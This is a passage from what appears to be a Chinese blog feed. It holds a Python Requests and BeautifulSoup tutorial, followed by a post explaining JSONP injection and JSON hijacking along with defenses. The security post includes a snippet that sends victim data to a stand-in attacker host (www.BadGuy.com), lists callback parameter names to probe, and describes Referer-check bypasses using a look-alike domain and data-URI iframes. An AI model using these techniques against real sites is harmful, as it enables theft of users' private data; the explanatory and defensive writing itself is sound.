class="hljs-attr">r</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>, params=payload)</code></pre><p>也可以将一个列表作为值传入</p><pre><code class="hljs ini"><span class="hljs-attr">payload</span> = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: [<span class="hljs-string">&#x27;value2&#x27;</span>, <span class="hljs-string">&#x27;value3&#x27;</span>]&#125;</code></pre><h4 id="响应内容"><a class="header-anchor" href="#响应内容">🍭</a>响应内容</h4><pre><code class="hljs awk">r.textr.json<span class="hljs-regexp">//</span>json编码r.raw<span class="hljs-regexp">//</span>访问原始相应内容（stream=True）r.status_code<span class="hljs-regexp">//</span>检测反应状态码r.headers<span class="hljs-regexp">//</span>访问服务器返回给我们的响应头部信息</code></pre><p>Requests 会自动解码来自服务器的内容，编码方式通是过HTTP 头部推测而出，可以用<code>r.encoding</code>查看并更改。</p><p>response.text返回的是Unicode型的数据。—文本</p><p>response.content返回的是bytes型也就是二进制的数据。-----图片等</p><p>但是两者打印输出是一样的</p><h4 id="定制请求头"><a class="header-anchor" href="#定制请求头">🍭</a>定制请求头</h4><p>传递一个 dict 给 headers 参数：</p><pre><code class="hljs nix"><span class="hljs-built_in">import</span> requests<span class="hljs-attr">new_headers</span> = &#123;    <span class="hljs-string">&quot;User-Agent&quot;</span>:<span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.146 Safari/537.36&quot;</span>&#125;<span class="hljs-attr">response</span> = requests.get(<span class="hljs-string">&quot;url&quot;</span>,<span class="hljs-attr">headers</span> = new_headers)print(response.text)        <span class="hljs-comment">#正常输出</span></code></pre><h4 id="内置的状态码查询对象"><a class="header-anchor" href="#内置的状态码查询对象">🍭</a>内置的状态码查询对象</h4><pre><code class="hljs http"><span class="hljs-attribute">100</span>: (&#x27;continue&#x27;,),<span class="hljs-attribute">101</span>: (&#x27;switching_protocols&#x27;,),<span class="hljs-attribute">102</span>: (&#x27;processing&#x27;,),<span class="hljs-attribute">103</span>: (&#x27;checkpoint&#x27;,),<span class="hljs-attribute">122</span>: (&#x27;uri_too_long&#x27;, &#x27;request_uri_too_long&#x27;),<span class="hljs-attribute">200</span>: (&#x27;ok&#x27;, &#x27;okay&#x27;, &#x27;all_ok&#x27;, &#x27;all_okay&#x27;, &#x27;all_good&#x27;, &#x27;\o/&#x27;, &#x27;✓&#x27;),<span class="hljs-attribute">201</span>: (&#x27;created&#x27;,),<span class="hljs-attribute">202</span>: (&#x27;accepted&#x27;,),<span class="hljs-attribute">203</span>: (&#x27;non_authoritative_info&#x27;, &#x27;non_authoritative_information&#x27;),<span class="hljs-attribute">204</span>: (&#x27;no_content&#x27;,),<span class="hljs-attribute">205</span>: (&#x27;reset_content&#x27;, &#x27;reset&#x27;),<span class="hljs-attribute">206</span>: (&#x27;partial_content&#x27;, &#x27;partial&#x27;),<span class="hljs-attribute">207</span>: (&#x27;multi_status&#x27;, &#x27;multiple_status&#x27;, &#x27;multi_stati&#x27;, &#x27;multiple_stati&#x27;),<span class="hljs-attribute">208</span>: (&#x27;already_reported&#x27;,),<span class="hljs-attribute">226</span>: (&#x27;im_used&#x27;,),<span class="hljs-attribute">Redirection.</span><span class="hljs-attribute">300</span>: (&#x27;multiple_choices&#x27;,),<span class="hljs-attribute">301</span>: (&#x27;moved_permanently&#x27;, &#x27;moved&#x27;, &#x27;\o-&#x27;),<span class="hljs-attribute">302</span>: (&#x27;found&#x27;,),<span class="hljs-attribute">303</span>: (&#x27;see_other&#x27;, &#x27;other&#x27;),<span class="hljs-attribute">304</span>: (&#x27;not_modified&#x27;,),<span class="hljs-attribute">305</span>: (&#x27;use_proxy&#x27;,),<span class="hljs-attribute">306</span>: (&#x27;switch_proxy&#x27;,),<span class="hljs-attribute">307</span>: (&#x27;temporary_redirect&#x27;, &#x27;temporary_moved&#x27;, &#x27;temporary&#x27;),<span class="hljs-attribute">308</span>: (&#x27;permanent_redirect&#x27;,&#x27;resume_incomplete&#x27;, &#x27;resume&#x27;,), # These 2 to be removed in 3.0Client Error.<span class="hljs-attribute">400</span>: (&#x27;bad_request&#x27;, &#x27;bad&#x27;),<span class="hljs-attribute">401</span>: (&#x27;unauthorized&#x27;,),<span class="hljs-attribute">402</span>: (&#x27;payment_required&#x27;, &#x27;payment&#x27;),<span class="hljs-attribute">403</span>: (&#x27;forbidden&#x27;,),<span class="hljs-attribute">404</span>: (&#x27;not_found&#x27;, &#x27;-o-&#x27;),<span class="hljs-attribute">405</span>: (&#x27;method_not_allowed&#x27;, &#x27;not_allowed&#x27;),<span class="hljs-attribute">406</span>: (&#x27;not_acceptable&#x27;,),<span class="hljs-attribute">407</span>: (&#x27;proxy_authentication_required&#x27;, &#x27;proxy_auth&#x27;, &#x27;proxy_authentication&#x27;),<span class="hljs-attribute">408</span>: (&#x27;request_timeout&#x27;, &#x27;timeout&#x27;),<span class="hljs-attribute">409</span>: (&#x27;conflict&#x27;,),<span class="hljs-attribute">410</span>: (&#x27;gone&#x27;,),<span class="hljs-attribute">411</span>: (&#x27;length_required&#x27;,),<span class="hljs-attribute">412</span>: (&#x27;precondition_failed&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">413</span>: (&#x27;request_entity_too_large&#x27;,),<span class="hljs-attribute">414</span>: (&#x27;request_uri_too_large&#x27;,),<span class="hljs-attribute">415</span>: (&#x27;unsupported_media_type&#x27;, &#x27;unsupported_media&#x27;, &#x27;media_type&#x27;),<span class="hljs-attribute">416</span>: (&#x27;requested_range_not_satisfiable&#x27;, &#x27;requested_range&#x27;, &#x27;range_not_satisfiable&#x27;),<span class="hljs-attribute">417</span>: (&#x27;expectation_failed&#x27;,),<span class="hljs-attribute">418</span>: (&#x27;im_a_teapot&#x27;, &#x27;teapot&#x27;, &#x27;i_am_a_teapot&#x27;),<span class="hljs-attribute">421</span>: (&#x27;misdirected_request&#x27;,),<span class="hljs-attribute">422</span>: (&#x27;unprocessable_entity&#x27;, &#x27;unprocessable&#x27;),<span class="hljs-attribute">423</span>: (&#x27;locked&#x27;,),<span class="hljs-attribute">424</span>: (&#x27;failed_dependency&#x27;, &#x27;dependency&#x27;),<span class="hljs-attribute">425</span>: (&#x27;unordered_collection&#x27;, &#x27;unordered&#x27;),<span class="hljs-attribute">426</span>: (&#x27;upgrade_required&#x27;, &#x27;upgrade&#x27;),<span class="hljs-attribute">428</span>: (&#x27;precondition_required&#x27;, &#x27;precondition&#x27;),<span class="hljs-attribute">429</span>: (&#x27;too_many_requests&#x27;, &#x27;too_many&#x27;),<span class="hljs-attribute">431</span>: (&#x27;header_fields_too_large&#x27;, &#x27;fields_too_large&#x27;),<span class="hljs-attribute">444</span>: (&#x27;no_response&#x27;, &#x27;none&#x27;),<span class="hljs-attribute">449</span>: (&#x27;retry_with&#x27;, &#x27;retry&#x27;),<span class="hljs-attribute">450</span>: (&#x27;blocked_by_windows_parental_controls&#x27;, &#x27;parental_controls&#x27;),<span class="hljs-attribute">451</span>: (&#x27;unavailable_for_legal_reasons&#x27;, &#x27;legal_reasons&#x27;),<span class="hljs-attribute">499</span>: (&#x27;client_closed_request&#x27;,),Server Error.<span class="hljs-attribute">500</span>: (&#x27;internal_server_error&#x27;, &#x27;server_error&#x27;, &#x27;/o\&#x27;, &#x27;✗&#x27;),<span class="hljs-attribute">501</span>: (&#x27;not_implemented&#x27;,),<span class="hljs-attribute">502</span>: (&#x27;bad_gateway&#x27;,),<span class="hljs-attribute">503</span>: (&#x27;service_unavailable&#x27;, &#x27;unavailable&#x27;),<span class="hljs-attribute">504</span>: (&#x27;gateway_timeout&#x27;,),<span class="hljs-attribute">505</span>: (&#x27;http_version_not_supported&#x27;, &#x27;http_version&#x27;),<span class="hljs-attribute">506</span>: (&#x27;variant_also_negotiates&#x27;,),<span class="hljs-attribute">507</span>: (&#x27;insufficient_storage&#x27;,),<span class="hljs-attribute">509</span>: (&#x27;bandwidth_limit_exceeded&#x27;, &#x27;bandwidth&#x27;),<span class="hljs-attribute">510</span>: (&#x27;not_extended&#x27;,),<span class="hljs-attribute">511</span>: (&#x27;network_authentication_required&#x27;, &#x27;network_auth&#x27;, &#x27;network_authentication&#x27;),</code></pre><p>报错家族❌❌❌</p><h4 id="cookie"><a class="header-anchor" href="#cookie">🍭</a>cookie</h4><pre><code class="hljs awk">r.cookies[<span class="hljs-string">&#x27;example_cookie_name&#x27;</span>]<span class="hljs-regexp">//</span>访问响应中的cookie</code></pre><h4 id="重定向与请求历史"><a class="header-anchor" href="#重定向与请求历史">🍭</a>重定向与请求历史</h4><pre><code class="hljs awk">r.history<span class="hljs-regexp">//</span>追踪重定向</code></pre><p>禁用重定向：</p><pre><code class="hljs routeros">r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)</code></pre><h4 id="超时"><a class="header-anchor" href="#超时">🍭</a>超时</h4><pre><code class="hljs routeros">requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-attribute">timeout</span>=0.001)// timeout 参数设定的秒数时间之后停止等待响应</code></pre><h4 id="会话对象"><a class="header-anchor" href="#会话对象">🍭</a>会话对象</h4><p>跨请求保持某些参数,会在同一个session实例发出的所有请求之间保持cookie</p><p>跨请求保持一些 cookie:</p><pre><code class="hljs routeros">s = requests.Session()s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&#x27;http://httpbin.org/cookies/set/sessioncookie/123456789&#x27;</span>)r = s.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://httpbin.org/cookies&quot;</span>)</code></pre><h4 id="代理"><a class="header-anchor" href="#代理">🍭</a>代理</h4><pre><code class="hljs routeros">import requestsproxies = &#123;  <span class="hljs-string">&quot;http&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>,  <span class="hljs-string">&quot;https&quot;</span>: <span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span>,&#125;requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;http://example.org&quot;</span>, <span class="hljs-attribute">proxies</span>=proxies)</code></pre><p>or</p><p>编辑环境变量:</p><pre><code class="hljs routeros">$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTP_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:3128&quot;</span>$ <span class="hljs-builtin-name">export</span> <span class="hljs-attribute">HTTPS_PROXY</span>=<span class="hljs-string">&quot;http://10.10.1.10:1080&quot;</span></code></pre><h2 id="Beautiful-Soup解析库"><a class="header-anchor" href="#Beautiful-Soup解析库">🍭</a>Beautiful Soup解析库</h2><p>python的一个HTML或XML的解析库，可从网页中提取数据，它拥有强大的API和多样的解析方式。</p><p>特点：</p><ul><li>提供一些简单的方法和python式函数，用于浏览，搜索和修改解析树，通过解析文档为用户提供需要抓取的数据</li><li>自动将转入稳定转换为Unicode编码，输出文档转换为UTF-8编码</li><li>Beautiful Soup位于流行的Python解析器（如<code>lxml</code>和<code>html5lib</code>）之上，允许尝试不同的解析策略或交易速度以获得灵活性。</li></ul><p>Beautiful Soup类的基本元素：</p><p>1、Tag——标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;表明开头和结尾</p><p>2、Name——标签的名字，<code>&lt;p&gt;...&lt;/p&gt;</code>的名字是’p’,格式：<code>&lt;tag&gt;.name</code></p><p>3、Attributes——标签的属性，字典形式组织，格式：<code>&lt;tag&gt;.attrs</code></p><p>4、NavigableString——标签内非属性字符串，<code>&lt;&gt;...&lt;/&gt;</code>中的字符串，格式：<code>&lt;tag&gt;.string</code></p><p>5、Comment——标签内字符串的注释部分，一种特殊的Comment类型（<strong>尖括号叹号表示注释开始</strong>：<code>&lt;!--This is a commet--&gt;</code>）</p><p>用法:</p><p>通过传入一段字符或一个文件句柄，BeautifulSoup的构造方法得到一个文档的对象，选择合适的解析器来解析文档，可手动指定将选择指定的解析器来解析文档,Beautiful  Soup将复杂的HTML文档转换成一个复杂的树形结构，每个节点都是python对象，所有对象可以归纳为4种：Tag、NavigableString、BeautifulSoup、Comment</p><p><img src="/2021/02/19/Soup4/1.png" alt="1"></p><h3 id="节点选择器"><a class="header-anchor" href="#节点选择器">🍭</a>节点选择器()</h3><h4 id="选择元素"><a class="header-anchor" href="#选择元素">🍭</a>选择元素</h4><pre><code class="hljs awk">soup.head<span class="hljs-regexp">//</span>获取head标签soup.p.b<span class="hljs-regexp">//</span>获取p节点下的b节点soup.p.string<span class="hljs-regexp">//</span>获取第一个p节点下的文本soup.head.title.string<span class="hljs-regexp">//</span>嵌套选择</code></pre><h4 id="获取名称"><a class="header-anchor" href="#获取名称">🍭</a>获取名称</h4><pre><code class="hljs css"><span class="hljs-selector-tag">soup</span><span class="hljs-selector-class">.body</span><span class="hljs-selector-class">.name</span></code></pre><h4 id="获取节点属性"><a class="header-anchor" href="#获取节点属性">🍭</a>获取节点属性</h4><pre><code class="hljs stylus">soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>    <span class="hljs-comment">//获取p节点所有属性</span>soup<span class="hljs-selector-class">.p</span><span class="hljs-selector-class">.attrs</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//获取p节点class属性</span>soup<span class="hljs-selector-class">.p</span>[<span class="hljs-string">&#x27;class&#x27;</span>]  <span class="hljs-comment">//以字典形式直接获取p节点class属性</span></code></pre><h4 id="获取内容"><a class="header-anchor" href="#获取内容">🍭</a>获取内容</h4><pre><code class="hljs livecodeserver">soup.p.<span class="hljs-keyword">string</span><span class="hljs-comment"> //获取第一个p节点下的文本</span>soup.<span class="hljs-keyword">a</span>.next_element||soup.<span class="hljs-keyword">a</span>.previous_elemen<span class="hljs-comment">t//获取上一个或下一个被解析的对象</span>soup.<span class="hljs-keyword">a</span>.next_elements||soup.<span class="hljs-keyword">a</span>.previous_element<span class="hljs-comment">s//迭代器向前或者后访问文档解析内容</span></code></pre><h4 id="子节点和子孙节点"><a class="header-anchor" href="#子节点和子孙节点">🍭</a>子节点和子孙节点</h4><pre><code class="hljs awk">soup.p.contents<span class="hljs-regexp">//</span>获取直接子节点以列表形式返回内容soup.p.children<span class="hljs-regexp">//</span>获取直接子节点以生成器的类型返回soup.p.desccendants<span class="hljs-regexp">//</span>获取子孙节点，返回生成器</code></pre><h4 id="父节点和祖先节点"><a class="header-anchor" href="#父节点和祖先节点">🍭</a>父节点和祖先节点</h4><pre><code class="hljs awk">soup.b.parent<span class="hljs-regexp">//</span>获取父节点返回生成器soup.b.parents<span class="hljs-regexp">//</span>获取祖先节点，返回生成器</code></pre><h4 id="兄弟节点"><a class="header-anchor" href="#兄弟节点">🍭</a>兄弟节点</h4><pre><code class="hljs awk">soup.a.next_siblings<span class="hljs-regexp">//</span>返回下一个兄弟节点soup.a.previous_siblings<span class="hljs-regexp">//</span>返回上一个兄弟节点soup.a.next_siblings<span class="hljs-regexp">//</span>返回前面和后面的所有兄弟节点soup.a.previous_siblings<span class="hljs-regexp">//</span>返回生成器</code></pre><p><em>换行符也是一个节点，所以有时候在获取兄弟节点是通常是字符串或者空白</em></p><h3 id="方法选择器"><a class="header-anchor" href="#方法选择器">🍭</a>方法选择器</h3><p>节点选择器通过节点属性来选择，虽然快，但进行比较复杂的选择时不够灵活。此时我们可以引用一些查询方法</p><blockquote><p>find_all(name,attrs,recursive,text,**kwargs)查询所有符合条件的元素</p><blockquote><p>nam可查找的所有名字为name的标签(过滤器，正则表达式，列表……）</p><p>attrs表示传入的属性，以字典的形式指定如<code>id,attrs=&#123;'id':'123'&#125;</code>，(class属性是python中的关键字，查询时需要在class后面加上下划线）返回列表。</p><p>text匹配节点的文本，传入的形式可以是字符串也可以是正则表达式对象</p><p>recursive（只想搜索直接子节点可以设置recursive=Flase）</p><p>limit参数，限制返回结果的数量</p></blockquote></blockquote><blockquote><p>find()：返回单个元素(第一个匹配的元素)参数同find_all().</p></blockquote><p>以下用法与节点选择器对应</p><ul><li><code>find_parents()</code></li><li><code>find_parent()</code></li><li><code>find_next_siblings( )</code></li><li><code>find_next_sibling( )</code></li><li><code>find_previous_siblings( )</code></li><li><code>find_previous_sibling()</code></li></ul><p><code>find_all_next( )</code>&amp;<code>find_next()</code>：对当前tag之后的tag和字符串进行迭代，前者返回所有符合条件的节点，后者返回第一个符合条件的节点</p><p><code>find_all_previous()</code>和<code>find_previous()</code>：对当前tag之前的tag和字符串进行迭代，前者返回节点后所有符合条件的节点，后者返回第一个符合条件的节点</p><h3 id="CSS选择器"><a class="header-anchor" href="#CSS选择器">🍭</a>CSS选择器</h3><p>在 Tag 或 BeautifulSoup 对象的 select()方法中传入字符串参数即可使用CSS选择器的语法找到tag：</p><pre><code class="hljs dsconfig"><span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;.panel .panel-heading&#x27;</span>))//选择<span class="hljs-string">class </span>为.<span class="hljs-string">panel </span>下的<span class="hljs-string">class </span>为<span class="hljs-string">panel0heading的</span>标签<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;ul li&#x27;</span>))//选择标签<span class="hljs-string">ul </span>下的<span class="hljs-string">li标</span>签<span class="hljs-string">soup.</span><span class="hljs-string">select(</span><span class="hljs-string">&#x27;#list-2 .element&#x27;</span>))//选择<span class="hljs-string">id为</span><span class="hljs-built_in">list-2</span> 下的<span class="hljs-string">class为</span> <span class="hljs-string">element标</span>签</code></pre><h4 id="获取属性"><a class="header-anchor" href="#获取属性">🍭</a>获取属性</h4><pre><code class="hljs routeros"><span class="hljs-keyword">for</span> ul <span class="hljs-keyword">in</span> soup.select(<span class="hljs-string">&#x27;ul&#x27;</span>):    <span class="hljs-builtin-name">print</span>(ul[<span class="hljs-string">&#x27;id&#x27;</span>])    <span class="hljs-builtin-name">print</span>(ul.attrs[<span class="hljs-string">&#x27;id&#x27;</span>])</code></pre><h4 id="获取内容-v2"><a class="header-anchor" href="#获取内容-v2">🍭</a>获取内容</h4><pre><code class="hljs maxima"><span class="hljs-keyword">for</span> <span class="hljs-built_in">li</span> <span class="hljs-keyword">in</span> soup.select(&#x27;<span class="hljs-built_in">li</span>&#x27;):    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">li</span>.get_text())</code></pre><p>CSS更多属性见：<a href="http://www.w3school.com.cn/cssref/css_selectors.asp">CSS选择器</a></p><h3 id="tag修改"><a class="header-anchor" href="#tag修改">🍭</a>tag修改</h3><p>Beautiful Soup可以改变tag标志的属性的值，添加或删除属性和内容</p><pre><code class="hljs livecodeserver">markup=<span class="hljs-string">&#x27;&lt;a href=&quot;http://www.baidu.com/&quot;&gt;baidu&lt;/a&gt;&#x27;</span>soup=BeautifulSoup(markup,<span class="hljs-string">&#x27;lxml&#x27;</span>)soup.<span class="hljs-keyword">a</span>.<span class="hljs-keyword">string</span>=<span class="hljs-string">&#x27;百度&#x27;</span>soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>Tag.append() 添加内容,与列表的 .append() 方法类似</p><pre><code class="hljs livecodeserver">soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度&lt;/<span class="hljs-keyword">a</span>&gt;soup.<span class="hljs-keyword">a</span>.append(<span class="hljs-string">&#x27;一下&#x27;</span>)soup.<span class="hljs-keyword">a</span>&lt;<span class="hljs-keyword">a</span> href=<span class="hljs-string">&quot;http://www.baidu.com/&quot;</span>&gt;百度一下&lt;/<span class="hljs-keyword">a</span>&gt;</code></pre><p>还有很多：</p><ul><li><code>new_tag()</code>方法用于创建一个tag标签</li><li><code>insert()</code>将元素插入到指定的位置</li><li><code>inert_before()</code>在当前tag或文本节点前插入内容</li><li><code>insert_after()</code>在当前tag或文本节点后插入内容</li><li><code>clear()</code>移除当前tag的内容</li><li><code>extract()</code>将当前tag移除文档数，并作为方法结果返回</li><li><code>prettify()</code>将Beautiful Soup的文档数格式化后以Unicode编码输出，tag节点也可以调用</li><li><code>get_text()</code>输出tag中包含的文本内容，包括子孙tag中的内容</li><li><code>soup.original_encoding</code> 属性记录了自动识别的编码结果</li><li><code>from_encoding</code>:参数在创建BeautifulSoup对象是可以用来指定编码，减少猜测编码的运行速度</li></ul><p>结束:🍭🍭🍭</p><p>参考：<a href="https://2.python-requests.org/zh_CN/latest/user/advanced.html#advanced">高级用法 — Requests 2.18.1 文档</a></p><p><a href="https://2.python-requests.org/zh_CN/latest/user/quickstart.html">快速上手 — Requests 2.18.1 文档</a></p><p><a href="https://www.cnblogs.com/zhangxinqi/p/9218395.html">python3解析库BeautifulSoup4</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>json &amp; jsonp注入</title>
    <link href="/2021/02/19/jsonp/"/>
    <url>/2021/02/19/jsonp/</url>
    
    <content type="html"><![CDATA[<p>先来介绍一下json</p><h1>json</h1><blockquote><p><code> JavaScript Object Notation</code>,JavaScript 对象表示法</p><blockquote><p>JSON 是存储和交换文本信息的语法，类似 XML<br>JSON 使用 Javascript语法来描述数据对象，但它独立于语言和平台。<br>JSON 解析器和 JSON 库支持许多不同的编程语言<br>JavaScript 程序能够使用内建的 eval() 函数，用 JSON 数据来生成原生的 JavaScript 对象<br>通常用于服务端向网页传递数据</p><blockquote><p>JSON 文件的文件类型是 <code> .json</code><br>JSON 文本的 MIME 类型是 <code>application/json</code></p></blockquote></blockquote></blockquote><h3 id="json语法规则"><a class="header-anchor" href="#json语法规则">🍭</a>json语法规则</h3><blockquote><p>数据为 键/值 对。<br>数据由逗号分隔。<br>大括号保存对象<br>方括号保存数组<br>JSON 不能存储 Date 对象(可以以字符串为中介进行转换，函数也一样)<br>JSON 不允许包含函数</p><p><code>JSON.parse()</code>: 将一个 JSON 字符串转换为 JavaScript 对象。</p><blockquote><pre><code class="hljs css">&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.parse</span>(<span class="hljs-selector-tag">text</span><span class="hljs-selector-attr">[, reviver]</span>)</code></pre></blockquote></blockquote><blockquote><p><code>JSON.stringify()</code>: 于将 JavaScript 值转换为 JSON 字符串。</p><blockquote><pre><code class="hljs css">&gt;&gt;<span class="hljs-selector-tag">JSON</span><span class="hljs-selector-class">.stringify</span>(<span class="hljs-selector-tag">value</span><span class="hljs-selector-attr">[, replacer[, space]</span>])</code></pre></blockquote></blockquote><p>JSON 语法是 JavaScript 对象表示语法的子集,语法很简单，这里不再赘述。</p><h3 id="json-vs-xml"><a class="header-anchor" href="#json-vs-xml">🍭</a>json vs xml</h3><h4 id="same"><a class="header-anchor" href="#same">🍭</a>same:</h4><ul><li>具有&quot;自我描述性&quot;（人类可读）</li><li>具有层级结构（值中存在值）</li><li>数据可使用 AJAX 进行传输</li></ul><h4 id="difference-json角度"><a class="header-anchor" href="#difference-json角度">🍭</a>difference(json角度):</h4><ul><li>没有结束标签</li><li>读写的速度更快</li><li>能够使用内建的 JavaScript eval() 方法进行解析</li><li>使用数组</li><li>不使用保留字</li><li>简短</li></ul><h1>jsonp</h1><p>Jsonp(<code>JSON with Padding</code>)</p><blockquote><p>是 json 的一种&quot;使用模式&quot;，可以让网页从别的域名（网站）那获取资料，即跨域读取数据。</p><p>是一种非正式传输协议</p><p>允许用户传递一个callback参数给服务端，服务端返回数据时会将这个callback参数作为函数名来包裹住JSON数据，故客户端就可以随意定制自己的函数来自动处理返回数据。</p></blockquote><p>由来(理论)：</p><ul><li>Ajax直接请求普通文件存在跨域无权限访问的问题(因为<strong>同源策略</strong>详见:<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy">浏览器的同源策略</a>)</li><li>但Web页面上调用js文件时则不受是否跨域的影响（带有<code>src</code>属性的标签:<code>script、img、iframe</code>都拥有跨域的能力）。</li><li>故现在想通过纯web端（ActiveX控件、服务端代理、HTML5之Websocket除外）跨域访问数据就只能在远程服务器上把数据装进js格式的文件里，供客户端调用处理，</li><li>由于JSON简洁被js支持，客户端可以处理这种格式的数据，因此跨域调用远程js文件，便可以实现同源策略之下的跨域</li></ul><p>举个栗子:</p><p><img src="/2021/02/19/jsonp/1.png" alt="1"></p><p><code>jsonp.php</code>:</p><p><img src="/2021/02/19/jsonp/2.png" alt="2"></p><h2 id="JSONP利用"><a class="header-anchor" href="#JSONP利用">🍭</a>JSONP利用</h2><h4 id="JSON-Hijacking"><a class="header-anchor" href="#JSON-Hijacking">🍭</a>JSON Hijacking</h4><p>json 劫持原理其实跟CSRF一样（但是CSRF是模拟用户的身份去发送请求，JavaScript Hijacking是模拟用户的身份，窃取用户在服务器上的私隐信息），当某网站使用JSONP传递敏感数据的时候，攻击者可以构造恶意JSONP调用界面，诱导被攻击者访问：</p><p><img src="/2021/02/19/jsonp/3.png" alt="3"></p><h5 id="特点"><a class="header-anchor" href="#特点">🍭</a>特点</h5><ul><li><p>恶意站点是通过用户给它返回信任网站的JSON数组（JSON数组被浏览器认为是一段可执行的JavaScript脚本，json对象就不被认为是JavaScript脚本）获取用户私隐信息。</p></li><li><p>恶意站点必须实先知道用户返回的JSON的结构</p></li><li><p>恶意站点只能发送GET请求</p></li><li><p>需要浏览器支持</p><p>JSON 劫持代码要在jsonp基础上加上如下代码（发送get请求）</p><pre><code class="hljs accesslog">req.open(<span class="hljs-string">&quot;<span class="hljs-keyword">GET</span>&quot;</span>, <span class="hljs-string">&quot;http://www.BadGuy.com?obj=&quot;</span> +escape(objString),true); &#125; req.send(null); );</code></pre><p>在函数定义是引用<code>Object.prototype.__defineSetter__</code>函数:对Object的某属性设置一个Hook(类似于JavaScript函数劫持)，当有对象设置它的该属性时，都会触发上面这段代码的运行。但是此函数在现在多数浏览器中都失效了。</p></li></ul><h5 id="防御"><a class="header-anchor" href="#防御">🍭</a>防御</h5><ul><li>综合防御：判断<code>reference</code>和添加随机字串</li><li>使用加在url中的<code>token</code></li></ul><h5 id="挖掘"><a class="header-anchor" href="#挖掘">🍭</a>挖掘</h5><blockquote><p>burp抓包，jsonp数据传输会在mimetype中显示为script<br>控制台查找jsonp包<br>暴力穷举</p><blockquote><p>多数情况下会把jsonp的回传参数命名为callback，但也可能变形（callback参数可自定义）成如下形式:</p><blockquote><p>callback=attack</p><p>cb=attack</p><p>call=attack</p><p>jsonp=attack</p><p>jsonpcallback=attack</p><p>jsonpcb=attack</p><p>json=attack</p><p>jsoncallback=attack</p><p>jcb=attack</p></blockquote></blockquote></blockquote><h4 id="基础函数调用"><a class="header-anchor" href="#基础函数调用">🍭</a>基础函数调用</h4><p>若回调函数被硬编码进响应(即多个不同类型的请求都采用同样的回调函数名)，就会存在基础函数调用的危害。</p><h5 id="防御-v2"><a class="header-anchor" href="#防御-v2">🍭</a>防御</h5><p>严格限制对 JSONP 输出<code>callback</code>函数名的长度，函数调用名不可预测</p><h4 id="callback函数可定义的安全问题"><a class="header-anchor" href="#callback函数可定义的安全问题">🍭</a>callback函数可定义的安全问题</h4><p>在上面的实例中callback函数的名称可以自定义，当它没有严格过滤或审查，也会成为一个注入点：</p><p><img src="/2021/02/19/jsonp/4.png" alt="4"></p><h5 id="防御-v3"><a class="header-anchor" href="#防御-v3">🍭</a>防御</h5><ul><li>严格定义<code> Content-Type: application / json</code>：浏览器不解析恶意插入的 XSS 代码</li><li>过滤 callback 以及 JSON 数据输出</li><li>在请求中添加 csrfToken 并在后端进行验证</li></ul><p><strong>Content-Type 与 X-Content-Type-Options：</strong></p><p>如果在响应中API请求头X-Content-Type-Options被设置为nosniff，<strong>Content-Type必须设置为JavaScript</strong>(text/javascript, application/javascript, text/ecmascript等.)才能在所有浏览器中运行,如果没有设置X-Content-Type-Options: nosniff头，它能在所有的浏览器下工作,故在一些旧的浏览器中可以绕过。</p><h2 id="绕过"><a class="header-anchor" href="#绕过">🍭</a>绕过</h2><p>（当防御方式是判断<code>reference</code>是否为可信来源或添加随机值时）</p><blockquote><p><em><code>reference</code>伪造(<a href="http://qq.com.evil.com">qq.com.evil.com</a>)</em><br><em>暴力穷举</em><br><em>空reference</em>:</p><blockquote><p>构造一个不带HTTP Referer的请求:利用data URI(<strong>Data URLs</strong>，即前缀为 <code>data:</code> 协议的URL，其允许内容创建者向文档中嵌入小文件)</p><p>Data URLs 由四个部分组成：前缀(<code>data:</code>)、指示数据类型的MIME类型、*如果非文本则为可选的<code>base64</code>标记,如果数据是文本类型，可以直接将文本嵌入 (根据文档类型，使用合适的实体字符或转义字符。如果是二进制数据，可将数据进行base64编码之后再进行嵌入、*数据本身：</p><pre><code class="hljs markdown">&gt;&gt;data:[<span class="hljs-string">&lt;mediatype&gt;</span>][<span class="hljs-symbol">;base64</span>],<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">data</span>&gt;</span></span></code></pre><p>处理的代码包含了引号，双引号，以及其他一些被阻止的语句，接着使用base64编码payload（回调函数定义以及脚本）即可达到reference绕过</p><p>可使用的标签：</p><blockquote><p>iframe (在src属性中)<br>embed (在src属性中)<br>object (在data属性中)</p></blockquote></blockquote></blockquote><p>结束❤️❤️❤️</p><p>参考：<a href="https://www.runoob.com/json/json-jsonp.html">JSONP教程|菜鸟教程</a></p><p><a href="https://www.dazhuanlan.com/2020/01/29/5e31a80b198fd/">JSONP注入利用与防御</a></p><p><a href="https://www.jianshu.com/p/6fd8486f6f8b">json及jsonp注入</a></p><p><a 